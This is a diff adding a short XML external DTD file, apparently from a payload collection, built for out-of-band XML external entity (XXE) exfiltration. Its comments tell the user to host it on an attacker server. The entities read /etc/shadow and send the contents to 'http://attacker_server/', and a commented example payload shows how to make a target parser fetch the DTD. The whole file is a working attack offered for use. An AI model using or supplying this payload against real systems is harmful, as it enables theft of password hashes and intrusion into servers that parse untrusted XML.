@@ -1,0 +1,19 @@
+<!--Use this by hosting it on your attacker server-->
+<!--Change the file to whatever file you're hoping to exiltrate-->
+<!--Change the attacker_server to your server-->
+
+<!ENTITY % file SYSTEM "file:///etc/shadow">
+<!ENTITY % ent "<!ENTITY &#x25; exiltrate SYSTEM 'http://attacker_server/?%file;'>">
+%ent;
+%exiltrate;
+
+<!-- Make the target parser interpret your DTD by specifying it within a parameter entity and referencing that entity with a payload like:-->
+<!-- Payload:
+
+<?xml version="1.0" encoding="UTF-8"
+<!DOCType example [
+  <!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
+  %xxe;
+  ]>
+
+-->
